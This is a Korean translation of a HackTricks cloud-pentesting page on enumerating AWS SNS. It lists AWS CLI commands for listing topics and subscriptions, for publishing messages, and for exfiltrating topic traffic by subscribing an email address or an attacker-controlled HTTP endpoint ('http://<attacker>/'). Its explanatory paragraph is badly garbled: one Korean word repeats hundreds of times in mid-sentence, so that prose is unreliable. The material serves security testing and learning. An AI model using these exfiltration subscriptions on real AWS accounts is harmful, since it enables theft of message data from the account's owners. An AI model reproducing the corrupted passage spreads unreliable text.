# AWS - SNS Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## SNS

Amazon Simple Notification Service (Amazon SNS)는 **완전히 관리되는 메시징 서비스**로 설명됩니다. 이 서비스는 **응용 프로그램 간 (A2A)** 및 **응용 프로그램 대 개인 (A2P)** 통신 유형을 모두 지원합니다.

A2A 통신에 대한 주요 기능은 **게시/구독 (pub/sub) 메커니즘**입니다. 이러한 메커니즘은 고처럼 **주제**를 도입하여 고처럼 **다대다 메시징을 푸시 기반으로 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고처럼 고
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
주제가 FIFO 유형인 경우, 프로토콜 SQS를 사용하는 구독자만 사용할 수 있습니다(HTTP 또는 HTTPS는 사용할 수 없음).

또한, `--topic-arn`에 지역이 포함되어 있더라도 올바른 지역을 **`--region`**에 지정해야 합니다. 그렇지 않으면 액세스 권한이 없다는 오류가 발생할 수 있습니다.
{% endhint %}

### 인증되지 않은 액세스

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

### 권한 상승

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

### 사후 침투

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

### 지속성

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

# 참고 자료
* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
